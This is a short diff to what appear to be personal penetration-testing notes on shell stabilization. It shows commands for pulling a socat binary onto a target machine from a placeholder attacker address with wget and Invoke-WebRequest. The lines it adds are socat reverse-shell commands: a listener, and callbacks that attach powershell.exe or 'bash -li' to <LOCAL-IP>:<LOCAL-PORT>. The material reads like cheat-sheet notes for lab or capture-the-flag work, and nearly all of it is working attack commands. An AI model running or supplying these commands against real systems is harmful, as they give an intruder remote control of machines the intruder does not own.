@@ -82,5 +82,12 @@ SHELL STABILIZATION
 		- Send a static compiled binary to target machine by hosting locally with simple server and invoking a request from target
 			- Linux:  wget <LOCAL-IP>/socat -O /tmp/socat
 			- Windows: Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
+		- Wonky syntax:
+			- Reverse shell:
+				- listener: ```socat TCP-L:<port> -```
+				- call:
+					- Windows: ```socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes```
+					- Linux: ```socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"```				
+			- Bind shell: 
 	- General:
 		- change terminal size with stty <rows or cols> <num>
